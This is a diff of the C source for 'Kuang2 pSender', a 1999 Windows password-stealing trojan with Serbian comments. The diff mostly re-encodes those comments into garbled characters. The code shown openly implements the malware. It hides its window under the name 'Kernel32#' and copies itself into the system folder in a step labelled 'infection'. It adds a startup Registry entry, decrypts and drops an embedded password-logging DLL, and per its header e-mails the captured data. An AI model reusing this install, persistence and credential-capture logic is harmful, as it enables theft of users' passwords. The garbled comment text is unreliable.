@@ -1,7 +1,7 @@
 /***[ThuNderSoft]*************************************************************
-				  KAUNG2 pSender: Ñalje DUP podatke na e-mail
+				  KAUNG2 pSender: ≈°alje DUP podatke na e-mail
 								   ver: 0.34
-								˙˘ƒÕ WEIRD Õƒ˘˙
+								     WEIRD
 *****************************************************************************/
 
 /* HISTORY */
@@ -10,7 +10,7 @@
 // >>>>> RELEASE VERSION: 0.30 (04-mar-1999) <<<<<
 // ver 0.30 (02-mar-1999): getfilename bug je ispravljen
 // ver 0.27 (26-feb-1999): slanje na email
-// ver 0.23 (20-feb-1999): ubaÅen DLL i negovo kreiranje i startovanje hooka
+// ver 0.23 (20-feb-1999): ubaƒçen DLL i negovo kreiranje i startovanje hooka
 // ver 0.18 (15-feb-1999): born code
 
 #include <windows.h>
@@ -21,19 +21,19 @@
 
 #pragma aux Wmain "_*"
 
-// Maximalna duÇina imena fajla, poÑto se na osnovu njega kreiraju
+// Maximalna du≈æina imena fajla, po≈°to se na osnovu njega kreiraju
 // razna druga imena
 #define MAX_FILENAMELEN		31
 
 // Ove stvari se moraju same odrediti kako bi se ubrzao proces instalranja
-// Svaki put ih aÇuriraj kada se menja dll!
+// Svaki put ih a≈æuriraj kada se menja dll!
 #define		DLL_SIZE		5632
 #define		DL_NAME_OFS		0x1000
 
 char compname[MAX_COMPUTERNAME_LENGTH+1];	// ime kompjutera
-char sysfile[MAX_PATH+1];					// ime fajla koje beleÇi podatke
-char appname[MAX_PATH+1];					// ime exe fajla koje Üe biti ubaÅeno u Registry
-char dllname[MAX_PATH+1];					// ime dll-a koji Üe biti stvoren
+char sysfile[MAX_PATH+1];					// ime fajla koje bele≈æi podatke
+char appname[MAX_PATH+1];					// ime exe fajla koje ƒáe biti ubaƒçeno u Registry
+char dllname[MAX_PATH+1];					// ime dll-a koji ƒáe biti stvoren
 char dl_name[MAX_PATH+1];					// ime fajla za dll-a koji pamti passworde
 
 char psWndName[MAX_FILENAMELEN]="Kernel32#";     // ime nevidljivog pSender prozora
@@ -59,16 +59,16 @@ HWND hwndW;
 /*
 	InitApp
 	-------
-  ˛ Inicijalizacija aplikacije. WinMain mora prvo nju da pozove.
-  ˛ Registruje se windows klasa za aplikaciju. Kreira se glavni prozor. */
+  + Inicijalizacija aplikacije. WinMain mora prvo nju da pozove.
+  + Registruje se windows klasa za aplikaciju. Kreira se glavni prozor. */
 
 BOOL InitApp(HINSTANCE hInst)
 {
 	WNDCLASSEX wc;
 
-	/* DefiniÑemo parametre klase */
+	/* Defini≈°emo parametre klase */
 
-	wc.cbSize		 = sizeof(WNDCLASSEX);			// veliÅina strukture
+	wc.cbSize		 = sizeof(WNDCLASSEX);			// veliƒçina strukture
 	wc.style		 = 0;							// nema stilova klase
 	wc.lpfnWndProc	 = (WNDPROC) WndProc;			// message loop procedura
 	wc.cbClsExtra	 = 0;							// nema etxra data po klasi
@@ -87,9 +87,9 @@ BOOL InitApp(HINSTANCE hInst)
 
 	hwndW = CreateWindow(					// kreiramo glavni prozor aplikacije
 			psClassName,					// ime registrovane klase
-			psWndName,						// text za Title bar - da bi ga pronaÑao
+			psWndName,						// text za Title bar - da bi ga prona≈°ao
 			0,								// windows stil
-			-1, -1, 0, 0,					// pozicija i veliÅina
+			-1, -1, 0, 0,					// pozicija i veliƒçina
 			NULL,							// prethodni hwnd
 			NULL,							// handle za meni ili child-prozor
 			hInst,							// ova instanca poseduje (own) prozor
@@ -99,7 +99,7 @@ BOOL InitApp(HINSTANCE hInst)
 	if (!hwndW) return FALSE;	// ako prozor nije mogao da se kreira vrati FALSE
 
 	ShowWindow(hwndW, SW_HIDE); // javi Windowsu za prozor i sakrij ga - ovo daje WM_CREATE poruku!
-	return TRUE;				// sve je proÑlo dobro, blago meni
+	return TRUE;				// sve je pro≈°lo dobro, blago meni
 
 }
 
@@ -107,7 +107,7 @@ BOOL InitApp(HINSTANCE hInst)
 /*
 	WinMain
 	--------
-  ˛ poÅinjemo, ali na Weird naÅin :) */
+  + poƒçinjemo, ali na Weird naƒçin :) */
 
 int Wmain()
 {
@@ -115,14 +115,14 @@ int Wmain()
 	MSG msg;						// potrebno za MessageLoop
 	HANDLE hFout;					// handle za fajl
 	char *CmdLine;					// komandna linija
-	int i;							// pomoÜna varijabla
+	int i;							// pomoƒána varijabla
 	WSADATA W;						// za WSAStartup
 
 	LONG lRv;						// registry
 	HKEY hKey;						// registry
 	DWORD dwDisposition;			// registry
 
-	DWORD maxcname = MAX_COMPUTERNAME_LENGTH + 1;	// max duÇina cname
+	DWORD maxcname = MAX_COMPUTERNAME_LENGTH + 1;	// max du≈æina cname
 
 /***************************************************************************
 								  instalacija
@@ -140,7 +140,7 @@ int Wmain()
 	strcopyFaddc(appname, sysfile, '\\');
 	strcopyF(sysfile, appname);
 	strcopyF(regdataname, getfilename(CmdLine));// kopiraj samo ime u regdata
-	setfileext(regdataname, "exe");             // postavi exe extenziju u sluÅaju da je neka druga
+	setfileext(regdataname, "exe");             // postavi exe extenziju u sluƒçaju da je neka druga
 	i=strlengthF(regdataname)-1;
 	while(i) {regdataname[i]=_to_lower(regdataname[i]); i--;}	// konvertuj sva slova u mala osim prvog!
 	straddF(sysfile, regdataname);
@@ -156,14 +156,14 @@ int Wmain()
 	setfileext(regdataname, "task");            // 'extenzija' za regdata
 	strdecryptS(regstartup);					// dekriptuj
 
-	// Prvo proveravamo da li je ova aplikacija veÜ aktivna
-	if (FindWindow(NULL, psWndName)) return 0;	// ako jeste, izaîi
+	// Prvo proveravamo da li je ova aplikacija veƒá aktivna
+	if (FindWindow(NULL, psWndName)) return 0;	// ako jeste, izaƒëi
 
 	i=0;
-	// probaj da ga otvoriÑ <ime>.exe
+	// probaj da ga otvori≈° <ime>.exe
 	hFout=CreateFile(appname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFout==INVALID_HANDLE_VALUE) {			// ako <ime>.exe ne postoji
-		// ako smo ovde znaÅi da Kuang2 pSender nije instaliran na sistem
+		// ako smo ovde znaƒçi da Kuang2 pSender nije instaliran na sistem
 		/*** INFEKCIJA ***/
 		if (CopyFile(CmdLine, appname, FALSE)) {	// kopiraj ga u system folder
 
@@ -174,14 +174,14 @@ int Wmain()
 				lRv=RegCreateKeyEx(HKEY_LOCAL_MACHINE, regstartup, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
 
 			if (lRv != ERROR_SUCCESS) {
-				return 3;	// neka greÑka i dalje
+				return 3;	// neka gre≈°ka i dalje
 			}
 
 			// setuj value
 			i=strlengthF(appname)+1;
 			RegSetValueEx(hKey, regdataname, 0, REG_SZ, appname, i);
 
-			RegCloseKey(hKey);		// zavrÑi zezanje sa registryjom
+			RegCloseKey(hKey);		// zavr≈°i zezanje sa registryjom
 		}
 	} else CloseHandle(hFout);		// zatvori fajl
 
@@ -194,19 +194,19 @@ int Wmain()
 		if (hFout!=INVALID_HANDLE_VALUE) {
 			/* Formiraj DLL */
 			rdecrypt(data_passdll, data_passdll);			// dekriptuj
-			strcopyF(&data_passdll[DL_NAME_OFS], dl_name);	// upiÑi ime fajla u koji Üe se zapisivati
-			WriteFile(hFout, data_passdll, DLL_SIZE, &upisano, NULL);	// upiÑi u dll
+			strcopyF(&data_passdll[DL_NAME_OFS], dl_name);	// upi≈°i ime fajla u koji ƒáe se zapisivati
+			WriteFile(hFout, data_passdll, DLL_SIZE, &upisano, NULL);	// upi≈°i u dll
 			CloseHandle(hFout);
 		}
 	} else CloseHandle(hFout);
 
 
-	if (i) return 0;	// ako smo inficirali onda izaîi da bi
-						// oslobodili trenutni exe da moÇe da se
-						// obriÑe.
+	if (i) return 0;	// ako smo inficirali onda izaƒëi da bi
+						// oslobodili trenutni exe da mo≈æe da se
+						// obri≈°e.
 
 /***************************************************************************
-							ukljuÅujemo nadgledanje
+							ukljuƒçujemo nadgledanje
 ****************************************************************************/
 
 	// sakrivamo ovaj proces
@@ -242,5 +242,5 @@ int Wmain()
 	// oslobodi WinSock
 	WSACleanup();
 
-	return msg.wParam;			// vraÜa vrednost od PostQuitMessage
+	return msg.wParam;			// vraƒáa vrednost od PostQuitMessage
 }
